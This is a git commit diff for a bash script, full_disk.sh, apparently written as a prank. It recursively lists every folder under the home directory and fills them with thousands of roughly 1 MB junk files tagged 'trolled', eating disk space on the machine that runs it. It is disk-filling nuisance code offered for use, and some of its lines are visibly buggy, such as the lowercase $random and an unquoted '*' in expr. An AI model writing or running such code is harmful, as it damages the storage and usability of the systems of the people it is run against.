4b84fd034f3344bdbd85ffc8c8661d7c0d1840a6
Thunlos <paulsalame33200@gmail.com>
2023-08-09 15:05:29 +0200

    full_disk finish + add idea

--- full_disk.sh
+++ full_disk.sh
@@ -1,21 +1,31 @@
 #!/bin/bash
 
 total_filled=0
+folders_list="~/"
 
 function make_file {
 	touch "$1"
 	truncate -s 41 "$1"
 	echo -n "trolled" >> "$1"
-	truncate -s $(expr 1024 '*' 5) "$1"
+	truncate -s 1024000 "$1"
+	total_filled=$(expr $total_filled + 1)
 }
 
-function fill_folder {
-	make_file "$1$RANDOM"
-	total_filled=total_filled+1
-	for d in "$1*/" ; do
-		fill_folder "$1$d"
+function add_folders {
+	for d in $1*/ ; do
+		if [ -d $d ] ; then
+			folders_list="$folders_list $d"
+			add_folders $d
+		fi
 	done
 }
 
-fill_folder "~/"
+add_folders ~/
+
+while ((total_filled < 5000)) ; do
+	for folder in $folders_list ; do
+		make_file "$folder$(expr $random * $random)"
+	done
+done
+
 echo "$total_filled"
